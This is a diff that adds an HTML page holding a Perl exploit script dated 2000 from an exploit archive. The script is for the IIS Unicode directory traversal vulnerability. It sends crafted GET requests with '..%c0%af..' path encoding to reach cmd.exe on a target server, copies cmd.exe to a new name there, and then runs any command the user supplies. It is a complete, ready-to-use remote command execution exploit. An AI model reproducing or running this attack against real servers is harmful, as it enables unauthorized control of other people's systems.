@@ -1,0 +1,65 @@
+<html><head><title>MS Windows IIS Unicode Remote Transversal Bug (4)</title></head><pre>#!/usr/bin/perl
+#
+# See http://www.securityfocus.com/vdb/bottom.html?section=exploit&amp;vid=1806
+#
+# Very simple PERL script to execute commands on IIS Unicode vulnerable servers
+# Use port number with SSLproxy for testing SSL sites
+# Usage: unicodexecute2 IP:port command
+# Only makes use of &quot;Socket&quot; library
+#
+# New in version2:
+# Copy the cmd.exe to something else, and then use it.
+# The script checks for this.
+# Thnx to security@nsfocus.com for discovering the cmd.exe copy part
+#
+# Roelof Temmingh 2000/10/26
+# roelof@sensepost.com http://www.sensepost.com
+
+use Socket;
+# --------------init
+if ($#ARGV&lt;1) {die &quot;Usage: unicodexecute IP:port command\n&quot;;}
+($host,$port)=split(/:/,@ARGV[0]);
+$target = inet_aton($host);
+
+# --------------test if cmd has been copied:
+$failed=1;
+$command=&quot;dir&quot;;
+@results=sendraw(&quot;GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n&quot;);
+foreach $line (@results){
+ if ($line =~ /sensepost.exe/) {$failed=0;}
+}
+$failed2=1;
+if ($failed==1) { 
+  print &quot;Sensepost.exe not found - Copying CMD...\n&quot;;
+  $command=&quot;copy c:\\winnt\\system32\\cmd.exe sensepost.exe&quot;;
+  $command=~s/ /\%20/g;
+  @results2=sendraw(&quot;GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n&quot;);
+  foreach $line2 (@results2){
+    if (($line2 =~ /copied/ )) {$failed2=0;}
+  }
+  if ($failed2==1) {die &quot;Copy of CMD failed - inspect manually:\n@results2\n\n&quot;};
+} 
+
+# ------------ we can assume that the cmd.exe is copied from here..
+$command=@ARGV[1];
+print &quot;Sensepost.exe found - Executing [$command] on $host:$port\n&quot;;
+$command=~s/ /\%20/g;
+my @results=sendraw(&quot;GET /scripts/..%c0%af../inetpub/scripts/sensepost.exe?/c+$command HTTP/1.0\r\n\r\n&quot;);
+print @results;
+
+# ------------- Sendraw - thanx RFP rfp@wiretrip.net
+sub sendraw {   # this saves the whole transaction anyway
+  my ($pstr)=@_;
+  socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+    die(&quot;Socket problems\n&quot;);
+  if(connect(S,pack &quot;SnA4x8&quot;,2,$port,$target)){
+    my @in;
+    select(S);      $|=1;   print $pstr;
+    while(&lt;S&gt;){ push @in, $_;}
+    select(STDOUT); close(S); return @in;
+    } else { die(&quot;Can't connect...\n&quot;); }
+}
+# Spidermark: sensepostdata
+
+
+# milw0rm.com [2000-11-18]</pre></html>
